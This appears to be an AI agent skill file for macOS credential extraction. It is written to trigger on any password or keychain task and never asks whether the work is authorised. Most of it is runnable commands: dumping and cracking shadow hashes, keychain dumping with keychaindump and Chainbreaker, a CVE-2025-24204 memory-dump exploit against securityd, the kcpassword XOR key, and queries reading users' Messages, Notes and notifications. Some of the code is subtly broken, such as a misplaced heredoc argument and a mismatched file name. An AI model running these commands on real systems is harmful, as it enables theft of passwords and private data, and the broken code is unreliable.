---
name: macos-security-artifacts
description: macOS security analysis and credential extraction. Use this skill whenever the user needs to extract passwords, dump keychains, analyze user databases, or gather security artifacts from macOS systems. Trigger for tasks involving shadow passwords, keychain extraction, notification databases, user preferences, or any macOS forensic/security investigation. Make sure to use this skill for any macOS credential recovery, password hash extraction, keychain dumping, or system security analysis tasks.
---

# macOS Security Artifacts & Credential Extraction

A comprehensive skill for analyzing macOS security artifacts, extracting credentials, and gathering forensic information from macOS systems.

## When to Use This Skill

Use this skill when you need to:
- Extract password hashes from macOS shadow files
- Dump and analyze macOS keychains
- Extract credentials from user databases (Messages, Notes, Notifications)
- Analyze system preferences and configuration files
- Investigate notification systems and their databases
- Perform macOS security assessments or penetration testing
- Extract credentials using known vulnerabilities (CVE-2025-24204, etc.)

## Prerequisites

- macOS system access (local or remote)
- Appropriate privileges (often root/sudo required)
- Understanding of macOS security architecture
- Tools: `plutil`, `security`, `sqlite3`, `dscl`, `vmmap`, `gcore` (on vulnerable builds)

## Password Extraction

### Shadow Passwords

Shadow passwords are stored in plist files in `/var/db/dslocal/nodes/Default/users/`.

**Dump all user information:**
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do 
  if [ -r "$l" ]; then 
    echo "$l"
    defaults read "$l"
  fi
done
```

**Extract hashes in hashcat format (-m 7100 for PBKDF2-SHA512):**
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do 
  plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$"}"
  for j in {iterations,salt,entropy}; do 
    l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -)
    if [[ $j == iterations ]]; then 
      echo -n $l
    else 
      base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"\$\"\$0}"
    fi
  done
  echo ""
done'
```

**Using dscl for specific users:**
```bash
sudo dscl . -read /Users/$(whoami) ShadowHashData
```

### /etc/master.passwd

This file is only used in single-user mode. It's rarely accessible on running systems.

## Keychain Extraction

### Using security Binary

```bash
# List certificates
security dump-trust-settings [-s] [-d]

# List keychain databases
security list-keychains

# List smartcards
security list-smartcards

# List keychain entries
security dump-keychain | grep -A 5 "keychain" | grep -v "version"

# Dump all info including secrets (requires password even as root)
security dump-keychain -d
```

### Keychaindump Tool

**Note:** Keychaindump doesn't work on macOS Big Sur and later due to security changes.

Keychaindump targets the `securityd` daemon to extract the master key from memory:

```bash
# Find securityd PID
sudo pgrep securityd

# Inspect memory for potential keys
sudo vmmap <securityd_PID> | grep MALLOC_TINY

# Run keychaindump
sudo ./keychaindump
```

### Chainbreaker

Chainbreaker extracts keychain information in a forensically sound manner:

**Dump all keys (without passwords):**
```bash
python3 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```

**Dump with SystemKey (requires root + SIP disabled):**
```bash
# Get decryption key
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo

# Decrypt passwords
python3 chainbreaker.py --dump-all --key <hex_key> /Library/Keychains/System.keychain
```

**Dump with password prompt:**
```bash
python3 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```

**Extract hash for cracking:**
```bash
# Get keychain hash
python3 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain

# Crack with hashcat
hashcat -m 23100 --keep-guessing hashes.txt dictionary.txt
```

### CVE-2025-24204: gcore Entitlement Exploit

**Vulnerable:** macOS 15.0–15.2 (Sequoia)
**Fixed:** macOS 15.3+

The `/usr/bin/gcore` binary shipped with `com.apple.system-task-ports.read` entitlement, allowing any local admin to dump any process memory even with SIP/TCC enforced.

**Exploitation:**
```bash
# Find securityd PID
sudo pgrep securityd

# Dump securityd memory
sudo gcore -o /tmp/securityd $(pgrep securityd)

# Extract master key from memory dump
python3 - <<'PY'
import mmap, re, sys
with open('/tmp/securityd.' + sys.argv[1], 'rb') as f:
    mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
    for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}', mm):
        c = m.group(0)
        if b'SALTED-SHA512-PBKDF2' in c:
            print(c.hex())
            break
PY $(pgrep securityd)
```

Feed the extracted hex key to Chainbreaker with `--key <hex>` to decrypt the login keychain.

### kcpassword (Automatic Login)

If automatic login is enabled, the password is stored in `/etc/kcpassword` XORed with a known key.

**XOR Key:** `0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`

Use scripts like [this one](https://gist.github.com/opshope/32f65875d45215c3677d) to extract the password.

## User Database Analysis

### Messages Database

```bash
# List tables
sqlite3 $HOME/Library/Messages/chat.db .tables

# Query messages
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'

# Query attachments
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'

# Query deleted messages
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'

# Email snippets
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```

### Notifications Database

**Location:** `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`

**CVE-2024-44292/44293/40838/54504:** macOS 14.7–15.1 stored banner content without proper redaction. Fixed in 15.2.

```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/

# Extract strings from notification database
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```

**Important:** On affected builds, the database is world-readable. Copy it before updating to preserve artifacts.

### Notes Database

**Location:** `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

```bash
# List tables
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# Dump notes in readable format
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do 
  sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"
  zcat body1.gz.Z
done
```

## Preferences Analysis

**Location:** `$HOME/Library/Preferences`

**Using defaults CLI:**
```bash
# Read preferences
defaults read <domain>

# Modify preferences
defaults write <domain> <key> <value>

# Delete preferences
defaults delete <domain> <key>
```

The `/usr/sbin/cfprefsd` daemon handles preference modifications via XPC services.

## OpenDirectory Permissions

**File:** `/System/Library/OpenDirectory/permissions.plist`

This SIP-protected file contains permissions for accessing sensitive attributes like `ShadowHashData`, `HeimdalSRPKey`, and `KerberosKeys` by UUID.

## Notification Systems

### Darwin Notifications

**Daemon:** `/usr/sbin/notifyd`
**Config:** `/etc/notify.conf`

**Dump notification status:**
```bash
# Find notifyd PID
ps -ef | grep -i notifyd

# Send SIGUSR2 to dump status
sudo kill -USR2 <notifyd_PID>

# Read status file
cat /var/run/notifyd_<pid>.status
```

### Distributed Notification Center

**Daemon:** `/usr/sbin/distnoted`

Exposes XPC services and performs client verification.

### Apple Push Notifications (APN)

**Daemon:** `apsd`
**Preferences:** `/Library/Preferences/com.apple.apsd.plist`
**Database:** `/Library/Application Support/ApplePushService/aps.db`

```bash
# Query APN database
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db

# Check daemon status
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```

**Database Tables:**
- `incoming_messages`
- `outgoing_messages`
- `channel`

## User Notifications

- **CFUserNotification:** Pop-up messages on screen
- **Bulletin Board:** iOS-style banners (stored in Notification Center)
- **NSUserNotificationCenter:** macOS notification database at `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Security Considerations

1. **SIP (System Integrity Protection):** Many operations require SIP to be disabled or specific entitlements
2. **TCC (Transparency, Consent, and Control):** May block access to certain files even with root
3. **Keychain Locking:** If users lock their keychain after each use, memory-based extraction becomes ineffective
4. **Version Compatibility:** Many tools don't work on newer macOS versions (Big Sur+)
5. **Forensic Soundness:** Always copy artifacts before modifying or updating the system

## References

- [CVE-2025-24204: macOS gcore entitlement vulnerability](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [CVE-2024-44292 et al.: Notification Center SQLite disclosure](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)
- [Chainbreaker](https://github.com/n0fate/chainbreaker)
- [Keychaindump](https://github.com/juuso/keychaindump)
- [DaveGrohl (hashcat converter)](https://github.com/octomagon/davegrohl.git)
